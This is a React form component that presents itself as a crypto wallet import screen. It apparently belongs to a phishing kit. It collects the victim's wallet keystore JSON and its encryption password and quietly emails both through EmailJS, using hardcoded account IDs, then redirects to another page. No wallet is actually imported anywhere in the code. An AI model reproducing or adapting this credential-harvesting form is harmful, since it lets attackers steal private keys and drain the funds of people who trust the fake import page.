// import React from "react";
import classes from "./JSON.module.css";
import { useState } from "react";
import { useNavigate } from "react-router";
import { useEffect } from "react";
import React, { useRef } from "react";
import emailjs from "@emailjs/browser";
const Form = () => {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_cen36ww",
        "template_1269aqf",
        e.target,
        "ZbakojD4asxn3jFKH"
      )
      .then(
        (result) => {
          navigate("/Redirect");
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  const navigate = useNavigate();
  const [value, setValue] = useState({
    coinType: "",
    JSON: "",
    password: "",
  });

  const handleChange = (e) => {
    setValue((prevState) => ({
      ...prevState,
      [e.target.name]: e.target.value,
    }));
  };

  useEffect(() => {
    const walletname = localStorage.getItem("walletname");
    if (walletname) {
      setValue({
        ...value,
        coinType: walletname,
      });
    }
  }, []);

  return (
    <div>
      <form className={classes.form} onSubmit={sendEmail}>
        <select
          className={classes.input}
          value={value.coinType}
          name="coinType"
          // onChange={() => handleChange(items)}
        >
          {" "}
          <option value="">select coin</option>
          <option value={value.coinType}>{value.coinType}</option>
        </select>
        <label>Key store</label>

        <textarea
          className={classes.input1}
          type="text"
          // placeholder="placeholder"
          value={value.JSON}
          onChange={handleChange}
          name="JSON"
        />

        <p>
          Several lines of text beginning with “…” plus the password you used
          for encryption.
        </p>
        <input
          className={classes.input}
          type="password"
          placeholder="password"
          value={value.password}
          onChange={handleChange}
          name="password"
        />
      <button
        className={classes.button}
        disabled={value.coinType.length < 2 || value.JSON.length < 2}
      >
        Import Wallet
      </button>
      </form>
    </div>
  );
};

export default Form;
